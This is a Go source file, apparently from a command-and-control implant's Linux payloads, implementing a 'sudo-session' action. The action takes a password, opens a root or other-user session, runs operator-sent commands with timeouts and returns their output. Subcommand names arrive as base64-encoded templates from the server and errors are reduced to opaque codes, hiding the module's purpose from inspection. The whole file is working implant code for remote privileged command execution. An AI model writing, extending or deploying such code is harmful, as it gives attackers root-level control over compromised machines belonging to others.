// server/docker/payloads/Linux/action_sudo_session_linux.go
//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

// Timeout constants for sudo session commands
const (
	execCommandTimeout  = 5 * time.Second
	execAbsoluteTimeout = 6 * time.Second
)

// Template index constants (must match server-side common.go)
const (
	idxSudoSessCmdName         = 320 // sudo-session
	idxSudoSessStart           = 321 // start
	idxSudoSessStop            = 322 // stop
	idxSudoSessExec            = 323 // exec
	idxSudoSessExecStateful    = 324 // exec-stateful
	idxSudoSessEnableStateful  = 325 // enable-stateful
	idxSudoSessDisableStateful = 326 // disable-stateful
	idxSudoSessStatus          = 327 // status
	idxSudoSessDefaultUser     = 328 // root
)

// ElevCfg holds parsed template data
type ElevCfg struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
}

type ElevMsg struct {
	tpl *ElevCfg
}

// getTpl safely retrieves a template string by index
func (c *ElevMsg) getTpl(idx int) string {
	if c.tpl == nil || idx >= len(c.tpl.Templates) {
		return ""
	}
	return c.tpl.Templates[idx]
}

// parseTemplate extracts and parses the template from command data
func (c *ElevMsg) parseTemplate(ctx *OpCtx) {
	ctx.mu.RLock()
	cmd := ctx.CurrentMsg
	ctx.mu.RUnlock()

	if cmd == nil || cmd.Data == "" {
		return
	}

	// Decode base64
	decoded, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return
	}

	// Parse JSON
	var tpl ElevCfg
	if err := json.Unmarshal(decoded, &tpl); err != nil {
		return
	}

	c.tpl = &tpl
}

// getActiveSession retrieves and validates the sudo session from context.
// Returns the session and an error message if not available or inactive.
func getActiveSession(ctx *OpCtx) (*ElevCtx, string) {
	ctx.mu.RLock()
	sessionInterface := ctx.ElevCtx
	ctx.mu.RUnlock()

	if sessionInterface == nil {
		return nil, Err(E30)
	}

	session := sessionInterface.(*ElevCtx)

	// Use the session's own mutex to safely check isActive
	session.mu.Lock()
	active := session.isActive
	session.mu.Unlock()

	if !active {
		return nil, Err(E30)
	}

	return session, ""
}

func (c *ElevMsg) execute(ctx *OpCtx, args []string) OpResult {
	// Parse template from command data
	c.parseTemplate(ctx)

	if len(args) == 0 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	subCommand := args[0]

	// Handle "start" subcommand
	if subCommand == c.getTpl(idxSudoSessStart) {
		if len(args) < 2 {
			return OpResult{
				Output:      Err(E1),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		password := args[1]
		targetUser := c.getTpl(idxSudoSessDefaultUser) // Default to root

		// Check if a specific user was provided
		if len(args) >= 3 {
			targetUser = args[2]
		}

		// Check if session already exists (use helper for thread-safe check)
		if existingSession, _ := getActiveSession(ctx); existingSession != nil {
			return OpResult{
				Output:      Err(E27),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		// Get working directory
		ctx.mu.RLock()
		workingDir := ctx.WorkingDir
		ctx.mu.RUnlock()

		// Start new session with specified user
		session, err := StartSudoSessionAsUser(password, targetUser, workingDir)
		if err != nil {
			return OpResult{
				Output:      ErrCtx(E31, targetUser),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		// Store session in context
		ctx.mu.Lock()
		ctx.ElevCtx = session
		ctx.mu.Unlock()

		// Build output message - handle nil cmd/Process
		pid := 0
		if session.cmd != nil && session.cmd.Process != nil {
			pid = session.cmd.Process.Pid
		}

		return OpResult{
			Output:      SuccCtx(S4, fmt.Sprintf("%s|%d", targetUser, pid)),
			EC:    0,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "exec" or "exec-stateful" subcommand
	if subCommand == c.getTpl(idxSudoSessExec) || subCommand == c.getTpl(idxSudoSessExecStateful) {
		if len(args) < 2 {
			return OpResult{
				Output:      Err(E1),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		session, errMsg := getActiveSession(ctx)
		if session == nil {
			return OpResult{
				Output:      errMsg,
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		// If exec-stateful, temporarily enable stateful mode
		if subCommand == c.getTpl(idxSudoSessExecStateful) {
			// Try to enable stateful if not already enabled
			session.mu.Lock()
			stateful := session.useStateful
			session.mu.Unlock()

			if !stateful {
				if err := session.enableStatefulMode(); err != nil {
					return OpResult{
						Output:      Err(E19),
						EC:    1,
						Done: time.Now().Format(time.RFC3339),
					}
				}
			}
		}

		// execute command with timeout protection
		command := strings.Join(args[1:], " ")

		type execResult struct {
			output   string
			exitCode int
			err      error
		}

		resultChan := make(chan execResult, 1)

		go func() {
			output, exitCode, err := session.executeCommand(command, execCommandTimeout)
			resultChan <- execResult{output, exitCode, err}
		}()

		// Wait with timeout
		select {
		case result := <-resultChan:
			if result.err != nil {
				// Only show error if no output
				if result.output == "" {
					return OpResult{
						Output:      Err(E25),
						EC:    result.exitCode,
						Done: time.Now().Format(time.RFC3339),
					}
				}
			}

			return OpResult{
				Output:      result.output,
				EC:    result.exitCode,
				Done: time.Now().Format(time.RFC3339),
			}

		case <-time.After(execAbsoluteTimeout):
			return OpResult{
				Output:      Err(E9),
				EC:    124,
				Done: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Handle "enable-stateful" subcommand
	if subCommand == c.getTpl(idxSudoSessEnableStateful) {
		session, errMsg := getActiveSession(ctx)
		if session == nil {
			return OpResult{
				Output:      errMsg,
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		if err := session.enableStatefulMode(); err != nil {
			return OpResult{
				Output:      Err(E19),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		return OpResult{
			Output:      Succ(S3),
			EC:    0,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "disable-stateful" subcommand
	if subCommand == c.getTpl(idxSudoSessDisableStateful) {
		session, errMsg := getActiveSession(ctx)
		if session == nil {
			return OpResult{
				Output:      errMsg,
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		session.setStateful(false)

		return OpResult{
			Output:      Succ(S3),
			EC:    0,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "status" subcommand
	if subCommand == c.getTpl(idxSudoSessStatus) {
		// For status, we check for session existence but don't require it to be active
		ctx.mu.RLock()
		sessionInterface := ctx.ElevCtx
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return OpResult{
				Output:      Err(E30),
				EC:    0,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*ElevCtx)
		return OpResult{
			Output:      session.getInfo(),
			EC:    0,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Handle "stop" subcommand
	if subCommand == c.getTpl(idxSudoSessStop) {
		ctx.mu.Lock()
		sessionInterface := ctx.ElevCtx

		if sessionInterface == nil {
			ctx.mu.Unlock()
			return OpResult{
				Output:      Err(E30),
				EC:    0,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*ElevCtx)
		targetUser := session.targetUser
		if targetUser == "" {
			targetUser = c.getTpl(idxSudoSessDefaultUser)
		}

		err := session.Close()
		ctx.ElevCtx = nil
		ctx.mu.Unlock()

		if err != nil {
			return OpResult{
				Output:      Err(E19),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}

		return OpResult{
			Output:      SuccCtx(S5, targetUser),
			EC:    0,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Unknown subcommand
	return OpResult{
		Output:      ErrCtx(E21, subCommand),
		EC:    1,
		Done: time.Now().Format(time.RFC3339),
	}
}
